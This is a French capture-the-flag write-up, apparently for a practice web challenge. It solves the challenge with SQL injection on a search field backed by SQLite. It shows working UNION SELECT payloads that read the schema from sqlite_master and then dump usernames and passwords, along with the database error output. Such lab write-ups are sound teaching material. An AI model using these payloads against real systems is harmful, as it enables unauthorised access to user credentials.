Après quelques recherches sur l’application, il apparaît que le champ de recherche semble être injectable.
```
' ERROR
```
Ce qui nous renvoie une magnifique erreur sqlite3 :
```
Warning: SQLite3::query(): Unable to prepare statement: 1, near "ERROR": syntax error in /challenge/web-serveur/ch19/index.php on line 150
near "ERROR": syntax error
```
Sachant que l’on a à faire à du sqlite3, on peut essayer de déterminer des informations sur la base.
```
' UNION SELECT name FROM sqlite_master WHERE type='table'--
```
Cependant, le nombre de colonnes semble être incorrect comme l’indique le retour de la base ci dessous :
```
Warning: SQLite3::query(): Unable to prepare statement: 1, SELECTs to the left and right of UNION do not have the same number of result columns in /challenge/web-serveur/ch19/index.php on line 150
SELECTs to the left and right of UNION do not have the same number of result columns
```
Tentons de rajouter un champ, qui pourrait nous être utile, dans la requête :
```
' UNION SELECT sql,name FROM sqlite_master WHERE type='table'--
```
Ici, nous avons le bon nombre de colonnes et la requête se fait sans accro. Parmi les informations récoltées, nous avons
```
CREATE TABLE news(id INTEGER, title TEXT, description TEXT) (news)
CREATE TABLE users(username TEXT, password TEXT, Year INTEGER) (users)
```
Avec le nom de la table des utilisateurs ainsi que les colonnes la composant, il ne nous reste plus qu’une requête à faire :
```
' UNION SELECT username,password FROM users--
```

Ainsi on obtiens la liste des utilisateurs et leurs mot de passe, dont celui de l’administrateur, qui est le flag de ce challenge.
